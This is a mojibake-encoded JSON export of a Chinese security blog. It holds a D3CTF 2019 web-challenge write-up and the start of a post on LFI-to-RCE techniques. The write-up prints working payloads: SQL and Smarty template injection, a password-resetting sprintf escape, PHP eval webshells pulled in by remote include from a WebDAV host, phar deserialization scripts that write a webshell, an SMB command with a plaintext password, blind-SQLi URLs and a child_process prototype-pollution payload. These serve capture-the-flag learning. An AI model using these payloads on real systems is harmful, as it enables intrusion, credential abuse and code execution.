å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"D3CTF-wp","slug":"D3CTF-wp","date":"2019-11-26T00:01:11.000Z","updated":"2020-04-10T13:30:18.501Z","comments":true,"path":"2019/11/26/D3CTF-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/26/D3CTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• easyweb Showhub fakeonlinephp ezupload ezts å‚è€ƒé“¾æ¥: è¶ç€D^3CTFç¯å¢ƒè¿˜æ²¡å…³ï¼Œèµ¶ç´§å¤ç°ä¸€ä¸‹ easywebè¿™é¢˜ç»™å‡ºäº†æºç ï¼Œä»£ç å®¡è®¡ æ¼æ´è§¦å‘ç‚¹åœ¨controllers/user.php è·Ÿè¸ªget_view() è·Ÿè¸ªsql_safe()å’Œsafe_render() éå¸¸æ˜æ˜¾çš„åˆ©ç”¨ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨$usernameæ³¨å…¥çš„æ—¶å€™åŠ ä¸Š{ç»•è¿‡è¿‡æ»¤å³å¯ ç®€å•æµ‹è¯•ä¸€ä¸ª 1aa&#39;un&#123;ion se&#123;lect 666 limit 1,1# å¾—åˆ°666 ç„¶åæ•°æ®åº“ä¸­å¹¶æ²¡æœ‰flagï¼Œ å› ä¸ºæ˜¯smartyæ¸²æŸ“æ¨¡ç‰ˆï¼Œå°è¯•æ¨¡ç‰ˆæ³¨å…¥ 123&#123;&#123;$smarty.version&#125;&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D limit 1,1# ä½†æ˜¯å¾—ä½¿ç”¨å‡½æ•°ã€‚ã€‚ã€‚ 1234&#123;php&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#x2F;php&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7b7068707d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b2f7068707d limit 1,1# å‘ç°ä¸è¡Œï¼Œéœ€è¦ç”¨ä¸¤ä¸ªå¤§æ‹¬å·åŒ…è£¹ï¼Œå¯èƒ½æ˜¯è¢«æ¸²æŸ“ä¸€æ¬¡åä¼šå°‘ä¸€ä¸ªï¼Œå…·ä½“ç­‰ä¸‹æ¬¡æœ¬åœ°æ­å»ºä¸€ä¸‹smartyæ¨¡æ¿æ³¨å…¥ 123&#123;&#123;php&#125;&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#123;&#x2F;php&#125;&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7b7b7068707d7d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b7b2f7068707d7d limit 1,1# æœ‰æ—¶é—´è‡ªå·±æ­ä¸€ä¸‹smartyç¯å¢ƒå¤ç° Showhubç»™äº†æºç ã€‚ã€‚ã€‚å¾ˆå¤šæ—¶å€™çœ‹åˆ°æºç å°±ä¼šç´§å¼ ï¼Œä½†å…¶å®è¿™é‡Œæ–‡ä»¶ä¹Ÿä¸å¤š é—®é¢˜å‡ºç°åœ¨Models/Model.php sprintf()æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹å‰ä¹Ÿé‡åˆ°è¿‡ å‚è€ƒé“¾æ¥ï¼š https://blog.csdn.net/weixin_41185953/article/details/80485075 sprintf(format,arg1,arg2,arg++) arg1ã€arg2ã€++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨ã€‚ æ³¨é‡Šï¼šå¦‚æœ % ç¬¦å·å¤šäº arg å‚æ•°ï¼Œåˆ™æ‚¨å¿…é¡»ä½¿ç”¨å ä½ç¬¦ã€‚å ä½ç¬¦ä½äº % ç¬¦å·ä¹‹åï¼Œç”±æ•°å­—å’Œ â€œ$â€œ ç»„æˆã€‚ ä¸¾ä¸ªæ —å­ ç„¶åæ˜¯çœ‹æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344switch (format[inpos]) &#123;case &#39;s&#39;: &#123; zend_string * t; zend_string * str &#x3D; zval_get_tmp_string(tmp, &amp;t); php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, expprec, 0); zend_tmp_string_release(t); break; &#125;case &#39;d&#39;: php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign); break;case &#39;u&#39;: php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment); break;case &#39;g&#39;:case &#39;G&#39;:case &#39;e&#39;:case &#39;E&#39;:case &#39;f&#39;:case &#39;F&#39;: php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign); break;case &#39;c&#39;: php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp)); break;case &#39;o&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec); break;case &#39;x&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec); break;case &#39;X&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec); break;case &#39;b&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec); break;case &#39;%&#39;: php_sprintf_appendchar( &amp; result, &amp;outpos, &#39;%&#39;); break;default: break;&#125; å¯ä»¥çœ‹åˆ°ï¼Œ phpæºç ä¸­åªå¯¹15ç§ç±»å‹åšäº†åŒ¹é…ï¼Œ å…¶ä»–å­—ç¬¦ç±»å‹éƒ½ç›´æ¥breakäº†ï¼Œphpæœªåšä»»ä½•å¤„ç†ï¼Œç›´æ¥è·³è¿‡ï¼Œæ‰€ä»¥å¯¼è‡´äº†è¿™ä¸ªé—®é¢˜ï¼š æ²¡åšå­—ç¬¦ç±»å‹æ£€æµ‹çš„æœ€å¤§å±å®³å°±æ˜¯å®ƒå¯ä»¥åƒæ‰ä¸€ä¸ªè½¬ä¹‰ç¬¦, å¦‚æœ%åé¢å‡ºç°ä¸€ä¸ª,é‚£ä¹ˆphpä¼šæŠŠ\\å½“ä½œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹è€Œåƒæ‰, æœ€å%\\ï¼ˆæˆ–%1$\\ï¼‰è¢«æ›¿æ¢ä¸ºç©º é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šæ¥ï¼Œå› ä¸ºæˆ‘ä»¬è¦é€ƒé€¸å•å¼•å·ï¼Œé‚£ä¹ˆåŠ¿å¿…%ç¬¦å·å¤šä½™argå‚æ•°ï¼Œè€ƒè™‘ä½¿ç”¨%1$\\ï¼Œä»è€Œé€ƒé€¸è¿™é‡Œaddslashes()æ·»åŠ çš„\\ æ„é€  é‚£ä¹ˆè¿™é‡Œadminå¯†ç æ˜¯sha256åŠ å¯†çš„ï¼Œå³ä½¿çˆ†ç ´å‡ºæ¥äº†ä¹Ÿæ— æµäºäº‹ï¼Œæç¤ºä¿®æ”¹å¯†ç  åˆ©â½¤ON DUPLICATE KEY UPDATE ,å½“insertå·²ç»å­˜åœ¨çš„è®°å½•æ—¶ï¼Œæ‰§â¾Updateç”¨ä¸‹é¢çš„å½“ç”¨æˆ·å, å¯†ç éšä¾¿, æ³¨å†Œ 123admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#&#x3D;&gt;INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;) æœ¬åœ°ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¾ˆæˆåŠŸ è¿™é‡Œæ³¨å†Œå®Œç›´æ¥å°±ç™»å½•è¿›å»äº†ã€‚ã€‚ã€‚åº”è¯¥æ˜¯æ ¹æ®æ³¨å†Œæ—¶çš„ç”¨æˆ·åæŠŠ ä¸çŸ¥é“ä¸ºå•¥é€€å‡ºå†ç™»å½•ä¼šå¤±è´¥ã€‚ã€‚ã€‚ ä¸‹ä¸€æ­¥æ˜¯åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ”»å‡» å‚è€ƒé“¾æ¥ï¼š https://mengsec.com/2019/10/10/http-request-smugging/ CL-TE å¯èƒ½ç”±äºæˆ‘ä¸Šä¸€æ­¥ä¸æ˜¯ç›´æ¥ç™»å½•çš„ï¼Œå¯¼è‡´ä¹Ÿæ²¡æˆåŠŸ =========================== å¤±è´¥çš„åŸå› å¯èƒ½æ˜¯å‘çš„æ¬¡æ•°ä¸å¤Ÿå¤šï¼Œä¸‹æ¬¡ç”¨bpçš„intruderå‘åŒ… è¿™é¢˜çš„æ£€æµ‹åº”è¯¥æ˜¯åœ¨ä¸­é—´ä»£ç†ATSæœåŠ¡å™¨ï¼Œé€šè¿‡æ£€æµ‹æ‰å°†è¯·æ±‚è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚æ‰€ä»¥æˆ‘ä»¬ç™»é™†adminåï¼Œç›´æ¥è®¿é—®/WebConsoleæ˜¯æ— æ³•é€šè¿‡ä¸­é—´ä»£ç†çš„æ£€æµ‹çš„ã€‚ä½†æ˜¯å› ä¸ºæ£€æµ‹æ˜¯ä¸­é—´ä»£ç†ï¼Œåç«¯æœåŠ¡å™¨æ˜¯æ— æ¡ä»¶ç›¸ä¿¡ä¸­é—´ä»£ç†è½¬å‘çš„åŒ…çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡èµ°ç§çš„æ–¹å¼å°†æƒ³è¦çš„æ•°æ®åŒ…é€šè¿‡ä»£ç†è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚ fakeonlinephp å¼€å§‹ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œå‘ç°ç¯å¢ƒç»å¸¸ä¼š404ã€‚ã€‚ã€‚åº”è¯¥å°±æ˜¯ä¸ºäº†é˜²æ­¢ç”¨åŸè§£ å‚è€ƒç¿”å“¥çš„åšæ³•ï¼š https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/#fakeonlinephp è¿™é‡Œæ˜¯windowsç³»ç»Ÿï¼Œ æ­£å¸¸æƒ…å†µä¸‹æ— æ³•è¿œç¨‹åŒ…å«ï¼Œä½†æ˜¯å› ä¸ºæ˜¯windowsï¼Œå¯ä»¥ç»•è¿‡allow_url_includeçš„é™åˆ¶RFIï¼Œå‚è€ƒï¼š https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/ é¦–å…ˆå¯ç”¨WebDAV 1docker run -v ~&#x2F;webdav:&#x2F;var&#x2F;lib&#x2F;dav -e ANONYMOUS_METHODS&#x3D;GET,OPTIONS,PROPFIND -e LOCATION&#x3D;&#x2F;webdav -p 80:80 --rm --name webdav bytemark&#x2F;webdav å¯ç”¨ååœ¨~/webdav/dataä¸‹æ”¾ç½®phpæ–‡ä»¶ åŒ…å« 1?orange&#x3D;&#x2F;&#x2F;59.110.164.44&#x2F;&#x2F;webdav&#x2F;test.php å°è¯•å†™å…¥ 1234@&lt;?php phpinfo(); @eval($_POST[&#39;cmd&#39;]);?&gt; å‘ç°æ²¡ååº”ã€‚ã€‚å˜å½¢è¯•è¯• 1234@&lt;?php phpinfo(); @eval(($_POST)&#123;cmd&#125;);?&gt; æˆåŠŸï¼Œç”¨èšå‰‘è¿ ä½†æ˜¯é‡Œé¢çš„æ–‡ä»¶å†…å®¹æ˜¯ä¹±ç ã€‚ã€‚ã€‚ ä¿®æ”¹ä¸‹ç¼–ç å™¨æˆåŠŸ è¿™é‡Œå†å›å»çœ‹çœ‹phpinfo()ï¼Œæ­£å¥½å‰å¤©å­¦ä¹ çœ‹æ–‡ç« å«–äº†ä¸ªå·¥å…·ğŸ˜ https://github.com/proudwind/phpinfo_scanner åˆ©ç”¨èšå‰‘çš„æ’ä»¶æ‰«æå†…ç½‘ç«¯å£ .gitæ³„éœ² 1python git_extract.py http:&#x2F;&#x2F;3f2b604603.fakeonelinephp.d3ctf.io&#x2F;.git&#x2F; hint2.txt 1210.24 ğŸŒ§ï¸è¿™å°ğŸ’»è·‘ç€webæœåŠ¡ï¼Œä¸ºäº†é˜²æ­¢å¤§é»‘é˜”ç”¨nginx 0dayé»‘æˆ‘ç”µè„‘æ‹¿flagï¼ŒğŸ‘´æŠŠflagæ”¾åˆ°äº†å†…ç½‘çš„ğŸ’»ä¸Š(172.19.97.8 C:\\Users\\Administrator\\Desktop\\flag.txt è¿˜ç»™äº†ä¸ªå­—å…¸ æ˜¾ç„¶éœ€è¦æˆ‘ä»¬çˆ†ç ´å¯†ç è¿›å…¥å†…ç½‘ è€Œä¹‹å‰å°±é€šè¿‡æ‰«æå‘ç°è¿™å°å†…ç½‘ä¸»æœº172.19.97.8æ˜¯å¼€æ”¾445ç«¯å£SMBæœåŠ¡çš„ï¼Œè€Œä¸”ç»™äº†å­—å…¸ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä¸Šä¼ hydraå·¥å…·åè¿›è¡Œçˆ†ç ´å¯†ç å³å¯ï¼š ä¸Šä¼ hydraï¼Œä¸€å¼€å§‹ä¸è¡Œï¼Œæ¢äº†ä¸ªç›®å½•æˆåŠŸäº† ä½†æ˜¯è™šæ‹Ÿç»ˆç«¯ä»ç„¶æ‰§è¡Œä¸äº†å‘½ä»¤ã€‚ã€‚ã€‚ã€‚ç¿”å“¥è¯´ç”¨linuxçš„å¯ä»¥ğŸ‘ é‚£ä¹ˆkaliä¸­å®‰è£…antsowrdï¼Œä¸€å¼€å§‹å‚è€ƒç½‘ä¸Šçš„èŠ±äº†ä¸€äº›æ—¶é—´åˆ©ç”¨nodejså‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œè¿˜æ˜¯å‚è€ƒå®˜æ–¹githubçš„é è°± https://doc.u0u.us/zh-hans/getting_started/get_antsword.html å…ˆä¸‹è½½åŠ è½½å™¨ï¼Œå†åŠ è½½æºç å³å¯ å‰äººæ ½æ ‘ï¼Œå‘ç°12æ–‡ä»¶å¤¹å·²ç»ä¸Šä¼ å¥½äº†hydraï¼Œå½“æ—¶è‡ªå·±ä¸Šä¼ ä¹Ÿè¡Œï¼Œå°±æ˜¯æœ‰ç‚¹ä¸ç¨³å®š 1net use \\\\172.19.97.8\\ipc$ eDHU27TlY6ugslV &#x2F;user:administrator 1dir \\\\172.19.97.8\\c$ 1type \\\\172.19.97.8\\c$\\Users\\Administrator\\Desktop\\flag.txt è¿™æ–¹é¢çœŸçš„æ˜¯ç›²åŒºã€‚ã€‚ã€‚å¤ç°æˆåŠŸè¿˜æ˜¯æŒºæœ‰æ„Ÿè§‰çš„ ezupload å…ˆçœ‹çœ‹è¿‡æ»¤æ–¹æ³• phåç¼€è¢«banäº†ï¼Œæƒ³åˆ°.htaccess ä½†æ˜¯å¯¹å†…å®¹å­˜åœ¨é™åˆ¶ï¼Œä¸‹é¢ä¸¤ç§æ— æ³•ä½¿ç”¨ 12AddType application&#x2F;x-httpd-php .jpgphp_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot; è¿™é‡Œå¯ä»¥ä½¿ç”¨ 1AddHandler php7-script .txt file://å’Œphp://è¢«banäº†ï¼Œåˆ©ç”¨data://æˆ–è€…http://åè®® å…ˆå°è¯•å†™å…¥.htaccess 1action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess è°ƒè¯•æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯windowsç”±äºæ— æ³•å†™å…¥.å¼€å¤´çš„æ–‡ä»¶ï¼Œåˆ‡æ¢åˆ°linuxä¸‹ ä¸­é—´å‡ºç°äº†ç‚¹å°æŠ¥é”™æŸ¥çœ‹error_logå³å¯ å†å¼€å¯ä¸‹æ‰©å±• 12LoadModule rewrite_module modules&#x2F;mod_rewrite.soAllowOverride All çªç„¶å‘ç°äº‹æƒ…å¹¶ä¸ç®€å•ğŸ˜±ã€‚ã€‚ã€‚ä¸ºå•¥ä¹‹å‰__destruct()å†™å…¥çš„æ–‡ä»¶ä¸å­˜åœ¨ã€‚ã€‚error_logçœ‹ä¸€ä¸‹æç¤ºæ²¡æœ‰æƒé™ã€‚ã€‚ã€‚ä½†æ˜¯åŒæ ·çš„æƒé™.htaccessæˆåŠŸåˆ›å»º è¿™å…¶å®ç®—æ˜¯ä¸€ä¸ªæç¤ºæŠŠï¼Œæœ¬åœ°æµ‹ä¸€ä¸‹__destruct()çš„å½“å‰è·¯å¾„ å‘ç°åœ¨æ ¹ç›®å½•ï¼Œé‚£ä¹ˆè¿™é‡Œè¦å†™å…¥çš„è¯å¯ä»¥é€šè¿‡è§¦å‘ååºåˆ—åŒ–æ¥å†™å…¥ï¼Œæ­£å¥½ä¹‹å‰çš„phar://æ²¡æœ‰è¢«ban å¹¶ä¸”pharæ˜¯å¯ä»¥gzipå‹ç¼©çš„ï¼Œä»è€Œç»•è¿‡å¯¹æŸäº›å­—ç¬¦çš„æ£€æŸ¥ é‚£ä¹ˆè¿˜éœ€è¦è§£å†³__destruct()ä¸­å†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„é—®é¢˜ï¼Œåˆ—ç›®å½• åˆ©ç”¨__toString() ä¸¾ä¸ªä¾‹å­ é‚£ä¹ˆæˆ‘ä»¬å…ˆè·å–ç»å¯¹è·¯å¾„ 1234567891011121314151617181920212223&lt;?php class dir&#123; public $userdir; public $filename; public $url; public function __construct($url,$filename) &#123; $this-&gt;url &#x3D; $url; $this-&gt;filename &#x3D; $filename; &#125; &#125; $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;); $a -&gt; userdir &#x3D; &#39;..&#x2F;&#39;; $b &#x3D; new dir(&#39;b&#39;,&#39;b&#39;); $b -&gt; userdir &#x3D; $a; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub $phar-&gt;setMetadata($b); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; å…¶ä¸­filenameä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œå…ˆæ”¾åˆ°vpsä¸Šï¼Œå‹ç¼©æˆgzï¼Œé‡å‘½åä¸º1 pharååºåˆ—åŒ– é‚£ä¹ˆæˆ‘ä»¬çš„ç»å¯¹è·¯å¾„å°±çŸ¥é“äº†ï¼Œ/var/www/html/50f3c73883917b44/e9afd20997dff75e292259158f0006fbï¼Œæˆ‘æœ¬æ¥è¿˜æƒ³å†çœ‹ä¸Šä¸€çº§ç›®å½•ï¼Œæç¤ºhacker!!ï¼Œåº”è¯¥æ˜¯å‹ç¼©åä»ç„¶è¢«æ£€æµ‹åˆ°äº†æŸäº›å­—ç¬¦ã€‚ã€‚ç›´æ¥ä¸€ä¸‹æ­¥ åˆ©ç”¨ååºåˆ—åŒ–å†™.txtæ–‡ä»¶ 12345678910111213141516171819202122&lt;?php class dir&#123; public $userdir; public $url; public $filename; public function __construct($url,$filename) &#123; $this-&gt;url &#x3D; $url; $this-&gt;filename &#x3D; $filename; &#125; &#125; $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;); $a -&gt; filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;6d4bcfa605eacb74&#x2F;upload&#x2F;e9afd20997dff75e292259158f0006fb&#x2F;glotozz&#39;; $a -&gt; userdir &#x3D; &#39;&lt;?php phpinfo();eval($_POST[cmd]);?&gt;&#39;; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub $phar-&gt;setMetadata($a); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; åˆæ˜¯è€å¥—è·¯ã€‚ã€‚ã€‚ 1chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;)); webroot in /var/www/html+webroot changesä¸€èˆ¬å°±æ˜¯å†åŠ ä¸€ä¸ªæ²™ç®± .htaccessçš„å…¶ä»–å†™æ³•AddHandler php7-script .txt __destruct()çš„è·¯å¾„ä¸ºæ ¹ç›®å½• pharå‹ç¼©(â½¤gzip)ç»•è¿‡å­—ç¬¦æ£€æµ‹ glob://ä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡open_basedirã€‚ã€‚ã€‚ã€‚ ezts======æœªå®Œå¾…ç»­ å§æ§½ï¼Œï¼Œç¯å¢ƒå…³äº†ã€‚ã€‚é‚£ä¹ˆè®°å½•ä¸‹æ€è·¯ KOAæ¡†æ¶https://github.com/koajs/koahttps://github.com/d-band/koa-orm æˆ‘æ„Ÿè§‰ä¹‹åwpè¿™ä¸ªåº”è¯¥æ˜¯fuzzå‡ºæ¥çš„ 123http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20((%271&amp;value&#x3D;1http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%201%23&amp;value&#x3D;1http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20(ascii(substr((select%20version()),1,1))%3E10)%23&amp;value&#x3D;1 ç›²æ³¨è„šæœ¬å‡ºadminè´¦å·å¯†ç  åŸå‹é“¾æ±¡æŸ“ 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execS... /flag æ˜¯root 400æƒé™, ç°åœ¨æ˜¯nodeâ½¤â¼¾, è¿˜éœ€è¦ææƒä¸€ä¸‹ CVE-2019-14287 å‚è€ƒé“¾æ¥: https://wx.zsxq.com/dweb2/index/group/824215518412 https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"LFIToRCEæ€è·¯","slug":"LFIToRCEæ€è·¯","date":"2019-11-24T13:03:15.000Z","updated":"2020-03-28T02:07:59.296Z","comments":true,"path":"2019/11/24/LFIToRCEæ€è·¯/","link":"","permalink":"https://glotozz.github.io/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• å…ˆè¯´è¯´ä»£ç å®¡è®¡ä¸­ï¼Œå­˜åœ¨æ–‡ä»¶ä¸Šä¼ è¡¨å•æˆ–è€…å‡½æ•°èƒ½å†™æ–‡ä»¶ PHPä¸­çš„ä¸€äº›åè®® ä½¿ç”¨ PHP å°è£…å™¨çš„ expect://command ä½¿ç”¨ PHP å°è£…å™¨çš„php://file ä½¿ç”¨ PHP å°è£…å™¨çš„php://filter ä½¿ç”¨ PHP çš„input://stream ä½¿ç”¨ data://text/plain;base64,command windowså¯ç»•è¿‡ allow_url_include çš„é™åˆ¶ RFI æ—¥å¿—æ–‡ä»¶ã€ç¯å¢ƒæ–‡ä»¶ç­‰å¯æ§æ–‡ä»¶ apache log getshell /proc/self/environ /var/log/mail åˆ©ç”¨PHPä¼šè¯å€¼æ‰§è¡ŒRCEä½¿ç”¨æ§åˆ¶ session+LFI getshell phpinfo-LFI åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell LFI + php7å´©æºƒ å‚è€ƒé“¾æ¥ å…ˆè¯´è¯´ä»£ç å®¡è®¡ä¸­ï¼Œå­˜åœ¨æ–‡ä»¶ä¸Šä¼ è¡¨å•æˆ–è€…å‡½æ•°èƒ½å†™æ–‡ä»¶ å†™å…¥è·¯å¾„åœ¨webç›®å½•å¤–ï¼Œå¤–éƒ¨ç”¨æˆ·æ— æ³•ç›´æ¥è®¿é—®æ—¶ åç¼€åæ— æ³•è¢«è§£æï¼Œæ¯”å¦‚jpgç­‰ é…åˆLFIå³å¯RCE ä¸€ä¸ªä¾‹å­ï¼š https://xz.aliyun.com/t/6229 è¿™ä¸ªçš„LFIç‚¹æ˜¯å‚æ•°ç”¨äºåŠ è½½ç›®æ ‡ç«™ç‚¹ä¸Šçš„JSæ–‡ä»¶ ç„¶åæ˜¯CTFä¸­çš„ä¸€äº›æ€è·¯ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ç¬¬ä¸€ä¸ª PHPä¸­çš„ä¸€äº›åè®®ä½¿ç”¨ PHP å°è£…å™¨çš„ expect://commandemmmï¼Œä½†æ˜¯è¿™ä¸ªä¸€èˆ¬ä¸å¼€å¯ï¼Œxxeä¹Ÿå¯ä»¥å’Œè¿™ä¸ªæ‰©å±•ç»“åˆ ä½¿ç”¨ PHP å°è£…å™¨çš„php://fileå¾ˆå¸¸è§ï¼Œè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ file:///path/to/file.ext åœ¨æ–‡ä»¶åŒ…å«ä¸­å…¶å®ä¹Ÿå°±æ˜¯ç­‰ä»·/path/to/file.ext ä½†æ˜¯å¦‚æœæ¥ä¸ªé¢˜ç›®ç»™ä½ æ¥ä¸ªæ­£åˆ™åŒ¹é…../ æˆ–/å¼€å¤´çš„æ—¶å€™å°±å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•æ¥ç»•è¿‡äº†ã€‚ ä½¿ç”¨ PHP å°è£…å™¨çš„php://filterä½¿ç”¨ PHP çš„input://stream allow_url_include é»˜è®¤ç¯å¢ƒåœ¨php5.2ä¹‹åé»˜è®¤ä¸ºoff,æ‰€ä»¥è¯´è¿™ä¸ªç”¨æ³•æ¯”è¾ƒé¸¡è‚‹,ä½†æ˜¯å¹³æ—¶åœ¨çœ‹phpinfoçš„æ—¶å€™å¯ä»¥æŸ¥çœ‹ä¸‹è¿™ä¸ªæ˜¯å¦å¼€å¯ã€‚ ä½¿ç”¨ data://text/plain;base64,command=============================æ–°å¢ä¸€ä¸ª windowså¯ç»•è¿‡ allow_url_include çš„é™åˆ¶ RFI å‚è€ƒé“¾æ¥ï¼š https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/ ========================================================================== æ—¥å¿—æ–‡ä»¶ã€ç¯å¢ƒæ–‡ä»¶ç­‰å¯æ§æ–‡ä»¶ æ–‡ä»¶è¯»å–æ¼æ´è·¯å¾„æ”¶é›†ï¼š https://blog.csdn.net/qq_33020901/article/details/78810035 ä¸€èˆ¬åœ¨Linuxç³»ç»Ÿä¸‹é€šè¿‡apt-get install apache2 é»˜è®¤å®‰è£…çš„apache æˆ–è€…nginxéƒ½æ²¡æœ‰æƒé™è®¿é—®è¿™äº›æ–‡ä»¶ ï¼Œä½†æ˜¯æœ‰æ—¶å€™æœ‰äº›ç®¡ç†å‘˜ä¼šå› 